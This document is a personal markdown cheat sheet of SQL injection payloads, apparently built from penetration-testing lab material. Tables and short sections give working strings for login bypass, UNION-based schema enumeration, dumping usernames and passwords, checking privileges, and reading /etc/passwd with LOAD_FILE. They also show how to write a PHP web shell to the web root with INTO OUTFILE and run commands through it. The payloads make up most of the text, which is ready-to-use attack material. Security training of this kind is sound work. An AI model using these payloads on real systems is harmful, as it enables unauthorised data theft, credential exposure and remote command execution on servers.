

## MySQL Operator Precedence

1. Division (`/`), Multiplication (`*`), Modulus (`%`)
2. Addition (`+`), Subtraction (`-`)
3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. `NOT` (`!`)
5. `AND` (`&&`)
6. `OR` (`||`)

## SQL Injection Payloads

### Auth Bypass

| Payload | Description |
|--------|-------------|
| `'+OR+1=1--`| Retrieving hidden data|
| `'admin' or '1'='1` | Basic auth bypass |
| `admin')-- -` | Bypass with SQL comment |
|`administrator'--' AND password = ''`|Subverting application logic|
|`administrator' or 1=1 --' AND password = ''`|Subverting application logic|

### Union Injection

| Payload | Description |
|--------|-------------|
| `' ORDER BY 1-- -` | Detect number of columns |
| `cn' UNION SELECT 1,2,3-- -` | Detect columns using `UNION` |
| `cn' UNION SELECT NULL,NULL,NULL-- -` | Using null |
| `cn' UNION SELECT NULL,'asd',NULL-- -` | Test for string |
| `cn' UNION SELECT 1,@@version,3,4-- -` | Get DB version |
| `' union select username, password from users--`| Get data from Users table|
| `UNION SELECT username, 2, 3, 4 FROM passwords-- -` | Dump columns using `UNION` |
| `' UNION SELECT username || '~' || password FROM users--` |Retrieving multiple values within a single column|


### Database Enumeration

| Payload | Description |
|--------|-------------|
| `SELECT @@version;` | MySQL version fingerprint |
| `SELECT SLEEP(5);` | Blind detection |
| `cn' UNION SELECT 1,database(),2,3-- -` | Current DB |
| `cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -` | Tables in `dev` DB |
| `cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -` | Columns in `credentials` table |
| `cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -` | Dump data |

### Privilege Enumeration

| Payload | Description |
|--------|-------------|
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Current DB user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Check for admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | All user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | Accessible directories |

### File Injection

| Payload | Description |
|--------|-------------|
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read system file |
| `SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt';` | Write string to file |
| `cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -` | Write PHP web shell |

## 📎 Reference

GitHub: [Payloads All The Things – SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)



INFORMATION_SCHEMA Database contains metadata of DBs and Tables in the server.

| Technique                              | Description                                                                                                   |
|----------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `' or 1=1-- -`                         | Basic SQL injection to bypass login or test vulnerability                                                     |
| `' order by 1-- -`                     | Detects the number of columns by incrementing the number in `ORDER BY` until an error occurs (total columns)  |
| `' UNION select 1,2,3-- -`             | Detects the number of columns using `UNION` injection by increasing the number of columns until no error      |
| `SELECT @@version`                     | Checks the database version                                                                                   |
| `SELECT SLEEP(5)`                      | Blind SQL injection to pause execution, used with other clauses to confirm queries                            |
| `SELECT POW(1,1)`                      | Alternative blind SQL injection method to verify responses                                                    |
| `SELECT * FROM my_database.users;`     | Selects data from another database or table                                                                   |
| `SELECT database()`                    | Retrieves the current database name                                                                           |

<br>

List of databases --> List of tables within each database --> List of columns within each table

List all databases:		`' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

List of tables within each database: `' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` (TABLE_NAME column stores table names, TABLE_SCHEMA column points to the database each table belongs to)

List of columns within each table: `' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

Dump data from a table in another database: `' UNION select 1, username, password, 4 from dev.credentials-- -`

## 1.1. Reading files

The DB user must have the **FILE privilege** to load a file's content into a table and then dump data from that table and read files.

Current USER: 
- `SELECT USER()`
- `SELECT CURRENT_USER()`
- `SELECT user from mysql.user`

Check USER Privileges:
- `SELECT super_priv FROM mysql.user`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

## 1.2. LOAD_FILE

Now that we know we have enough **privileges to read local system files**, let us do that using the **LOAD_FILE() function**.

`SELECT LOAD_FILE('/etc/passwd');`

`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

`UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` : the page ends up rendering the HTML code within the browser. The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.

## 1.3. Writing files

To be able to **write files** to the back-end server using a MySQL database, we **require** three things:
- User with **FILE privilege** enabled
- MySQL global **secure_file_priv** variable **not enabled**
- **Write access** to the location we want to write to on the back-end server

The **secure_file_priv** variable is used to determine **where to read/write files from**. An **empty value** lets us **read** files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, **NULL** means we **cannot read/write** from any directory. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`

## 1.4. SELECT INTO OUTFILE

The **SELECT INTO OUTFILE** statement can be used to **write data*** from select queries into files.
- `SELECT * from users INTO OUTFILE '/tmp/credentials';`
- `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

## 1.5. Writing Files through SQL Injection

To write a web shell, we must know the **base web directory** for the web server (i.e. **web root**). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots.
- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
- `union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

## 1.6. Writing a Web Shell

`<?php system($_REQUEST[0]); ?>`
`union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL: `http://SERVER_IP:PORT/shell.php?0=id`



# 2. Keep in mind

- Steps for an SQLi PoC:
  1. Identify injectable points: Find input fields or URL parameters that interact with the database.
  2. Inject SQL syntax: Add characters like ' or ", OR 1=1, --, etc., to see if the database responds in an unexpected way.
  3. Observe responses: If the query breaks or behaves differently (returns all data, errors, etc.), it's likely vulnerable.

- Keep note:
  1. Try to figure out what SQL query being used, end goal: like what we trying to display
  2. Take a look at the url and its parameter
  3. Look at the content of the page, it might tell the columns and datatype of the table
  4. Try figure out the communication between the web and back-end
  5. Review the methodology

- Try poking the target with **syntax** like `'`; `' --` or with **query** like `' order by 1 --`. If the **order by** query result in something interesting, try increase the **number** to figure out number of **columns**. 

- To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
  + **The type and version of the database software**.
  + **The tables and columns that the database contains**.

## Querying the database type and version

- Try figure out what **DMS being used (mysql, msql, oracle, ...)** to determine query. Then, try querying **database type and version**.

| Database type	| Query |
|-|-|
| **Microsoft, MySQL** | `SELECT @@version` |
| **Oracle** |`SELECT * FROM v$version` |
| **PostgreSQL** | `SELECT version()` |

Example: `' UNION SELECT @@version--`
Notice: each type of database may have different but similar query structure. Example, `' union select NULL, banner from v$version --`. As i was trying to retrieve `banner` from the `v$version`. 

In some cases, some **characters, operator or syntax** might be filtered which result in **error** being displayed. Try figure out which one got **filtered, or not accepted** by the **type of DB**. Example: when i tried `' order by 1 --` --> **error** but with `' order by 1 #` --> **200 OK**.

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database: `SELECT table_name, null FROM information_schema.tables`. Then, with **table names** being shows, we can use it to list all **columns** of each: `SELECT column_name, null FROM information_schema.columns WHERE table_name = 'Users'`.

On Oracle, you can find the same information as follows:
- You can list tables by querying `all_tables`: `SELECT * FROM all_tables`
- You can list columns by querying `all_tab_columns`: `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

## Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

`' UNION SELECT username || '~' || password FROM users--`

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character. The results from the query contain all the usernames and passwords, for example:

`administrator~s3cure` <br>
`wiener~peter` <br>
`carlos~montoya`



# 3. About Blind SQL injection

- Vulnerable to SQLi
- Not visible
- Exploit by guessing with **TRUE/FALSE** or **TIME based** query
- Time consuming
